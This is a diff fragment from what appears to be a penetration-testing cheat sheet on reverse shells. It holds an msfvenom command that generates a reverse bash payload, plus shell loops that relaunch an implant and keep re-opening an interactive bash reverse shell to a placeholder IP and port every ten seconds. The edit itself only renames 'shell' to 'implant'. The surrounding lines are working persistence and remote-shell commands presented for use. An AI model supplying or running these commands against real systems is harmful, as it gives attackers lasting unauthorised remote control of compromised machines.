@@ -68,7 +68,7 @@ $ msfvenom -p cmd/unix/reverse_bash_udp lhost=<IP> lport=<PORT>
 In case you might lose the callback connection. It's better to make it persistent.
 
 ```
-$ while true; do /bin/bash -c /path/to/shell; sleep 10; done
+$ while true; do /bin/bash -c /path/to/implant; sleep 10; done
 
 $ while true; do /bin/bash -i >& /dev/<protocol>/<IP>/<LPORT> 0>&1; sleep 10; done
 ```
